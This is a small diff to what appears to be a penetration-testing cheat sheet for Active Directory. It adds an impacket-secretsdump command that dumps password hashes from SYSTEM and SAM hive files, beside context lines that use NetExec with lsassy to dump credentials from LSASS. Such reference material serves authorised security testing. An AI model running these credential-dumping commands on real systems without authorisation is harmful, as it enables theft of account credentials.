@@ -706,6 +706,11 @@ bloodyAD --dc-ip <Domain_Controller_IP> -u <AD_user> -p <AD_password or LM:NT]> 
   NetExec smb <target_IP> -u <AD_user> -p <password> -H <hash_NT]> -M lsassy
   ```
 
+  ### Get hashes from SYSTEM and SAM
+  ```shell
+  impacket-secretsdump -system SYSTEM -sam SAM local
+  ```
+
 </details>
 
 <details>
